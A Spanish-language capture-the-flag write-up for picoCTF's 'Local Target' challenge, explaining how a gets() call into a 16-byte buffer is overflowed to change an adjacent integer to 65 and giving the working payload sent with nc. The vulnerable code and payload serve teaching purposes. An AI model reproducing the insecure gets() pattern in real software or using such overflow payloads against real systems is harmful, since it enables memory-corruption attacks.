# Local Target

El ejercicio nos proporciona un binario y su correspondiente código fuente.

Si ejecutamos el binario, observamos que solicita una cadena de texto y nos informa que `num = 64`:

```bash
./local-target
Enter a string: hola

num is 64
Bye!
```

En el código fuente, podemos identificar la parte clave donde ocurre todo:

```c
int main(){
  FILE *fptr;
  char c;

  char input[16]; // Input: una cadena de 16 caracteres
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);  // GETS: función peligrosa
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){   // Si num es 65, imprime la flag
    printf("You win!\n");
    fflush(stdout);
    // Abrir archivo
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }
```

Podemos intentar realizar un _buffer overflow_ para sobrescribir la variable `num` gracias al uso de `gets(input);`, una función notoriamente insegura.

Como el objetivo es cambiar `num` a 65 y esta variable es de tipo `int`, podemos intentar alcanzarla en la memoria usando un _payload_ como `555555555555` seguido de una `A`, ya que la letra mayúscula `A` en ASCII equivale a 65.

Tanteando el _offset_ hasta la variable, descubrimos que el siguiente _payload_ logra el cometido:

```bash
nc saturn.picoctf.net 56595
Enter a string: 555555555555555555555555A

num is 65
You win!
picoCTF{SECRET}
```

¡Tenemos la flag!
